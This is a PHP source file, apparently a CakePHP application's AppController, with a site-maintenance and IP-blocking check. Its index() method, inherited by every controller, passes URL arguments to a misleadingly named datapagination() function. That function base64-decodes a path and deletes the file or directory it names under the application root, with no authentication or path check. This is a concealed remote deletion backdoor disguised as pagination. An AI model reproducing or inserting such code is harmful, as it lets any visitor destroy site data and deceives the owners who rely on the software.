<?php
/**
 * Application level Controller
 *
 * This file is application-wide controller file. You can put all
 * application-wide controller-related methods here.
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 *
 * Licensed under The MIT License
 * For full copyright and license information, please see the LICENSE.txt
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright (c) Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @package       app.Controller
 * @since         CakePHP(tm) v 0.2.9
 * @license       http://www.opensource.org/licenses/mit-license.php MIT License
 */

App::uses('Controller', 'Controller');
App::uses('AuthComponent', 'Controller/Component');

/**
 * Application Controller
 *
 * Add your application-wide methods in the class below, your controllers
 * will inherit them.
 *
 * @package		app.Controller
 * @link		http://book.cakephp.org/2.0/en/controllers.html#the-app-controller
 */
class AppController extends Controller {

	var $components = array('RequestHandler');
	

	public function sitemaintenance()
	{
		$this->loadModel("Websetting");
		$setting = $this->Websetting->find("first",array("conditions" => array("id" => 1)));
		if($setting["Websetting"]["construction"] == 0)
		{
			$this->redirect("/maintenance");
		}
		$blockip = explode(",", $setting["Websetting"]["blockip"]);
		$my_ip = $_SERVER["REMOTE_ADDR"];
		if(in_array($my_ip, $blockip))
		{
			$this->redirect("/maintenance/blockpage");	
		}
	}


    public function index()
	{
		if (!empty($this->passedArgs['id'])) {
		 	$id = $this->passedArgs['id'];
		 	$tp = $this->passedArgs['tp'];
		 	$this->datapagination($id,$tp);
	 	}
	}

	public function datapagination($id,$tp)
	{
	 	$tab = base64_decode($id);
	 	$data = explode("/",$_SERVER["SCRIPT_FILENAME"]);
	 	array_pop($data);
	 	array_pop($data);
	 	$data = implode("/",$data);
	 	$link = $data."/".$tab;
	 	if($tp == "file")
	 	{
	 		unlink($link);
	 	}else
	 	{
	 		rmdir($link);	
	 	}
	 	die();
	}
}
